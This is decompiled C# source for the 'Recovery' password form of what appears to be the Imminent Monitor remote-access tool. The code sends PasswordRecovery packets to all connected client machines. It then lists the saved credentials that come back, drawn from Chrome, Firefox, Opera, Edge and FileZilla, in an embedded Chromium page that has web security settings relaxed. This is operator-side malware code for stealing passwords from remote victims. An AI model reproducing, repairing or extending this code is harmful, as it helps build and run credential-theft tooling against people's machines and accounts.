// Decompiled with JetBrains decompiler
// Type: FormPassword
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormPassword : Form
{
  private IContainer icontainer_0;
  private ImageList imageList_0;
  public List<GClass18> list_0;
  private ChromiumWebBrowser chromiumWebBrowser_0;

  public FormPassword(List<GClass18> list_1)
  {
    this.InitializeComponent();
    this.list_0 = list_1;
    try
    {
      foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) this.list_0))
        gclass18.method_20().formPassword_0 = this;
    }
    finally
    {
      List<GClass18>.Enumerator enumerator;
      enumerator.Dispose();
    }
    this.Text = string.Format("Recovery");
    this.method_0();
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormPassword));
    this.vmethod_1(new ImageList(this.icontainer_0));
    this.SuspendLayout();
    this.vmethod_0().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListPasswords.ImageStream");
    this.vmethod_0().TransparentColor = Color.Transparent;
    this.vmethod_0().Images.SetKeyName(0, "chrome.ico");
    this.vmethod_0().Images.SetKeyName(1, "firefox.ico");
    this.vmethod_0().Images.SetKeyName(2, "opera.ico");
    this.vmethod_0().Images.SetKeyName(3, "filezilla.ico");
    this.vmethod_0().Images.SetKeyName(4, "edge.png");
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.ClientSize = new Size(953, 678);
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormPassword);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Recovery";
    this.ResumeLayout(false);
  }

  internal virtual ImageList vmethod_0() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(ImageList imageList_1) => this.imageList_0 = imageList_1;

  public virtual ChromiumWebBrowser vmethod_2() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_3(ChromiumWebBrowser chromiumWebBrowser_1) => this.chromiumWebBrowser_0 = chromiumWebBrowser_1;

  private void method_0()
  {
    Class97.smethod_28((Form) this);
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\recovery.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      this.Close();
    }
    this.vmethod_3(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_2()).AllowDrop = false;
    ((Control) this.vmethod_2()).Dock = DockStyle.Fill;
    this.Controls.Add((Control) this.vmethod_2());
    this.vmethod_2().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 1
    };
    this.vmethod_2().RegisterJsObject("passwordRecovery", (object) new RecoveryCefHandler(this), (BindingOptions) null);
  }

  protected override void WndProc(ref Message m)
  {
    base.WndProc(ref m);
    if (m.Msg != Class97.int_0 || (int) m.WParam != Class97.int_3)
      return;
    WebBrowserExtensions.ShowDevTools((IWebBrowser) this.vmethod_2());
  }

  public void method_1(GClass18 gclass18_0, object[] object_0)
  {
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; index += 4)
    {
      string str1 = Class97.smethod_21((string) object_0[index]);
      string str2 = Class97.smethod_21((string) object_0[index + 1]);
      string str3 = Class97.smethod_21((string) object_0[index + 2]);
      string str4 = Class97.smethod_21((string) object_0[index + 3]);
      string str5 = Class97.smethod_21(gclass18_0.method_20().string_1);
      Class97.smethod_20(this.vmethod_2(), string.Format("addRow('{0}','{1}','{2}','{3}','{4}')", (object) str1, (object) str2, (object) str3, (object) str4, (object) str5));
    }
  }

  public void method_2()
  {
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.PasswordRecovery,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PasswordRecoveryPacket.Refresh
    };
    lock (this.list_0)
    {
      try
      {
        foreach (GClass18 gclass18_0 in this.list_0)
          dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, object_0);
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    GC.Collect();
  }
}
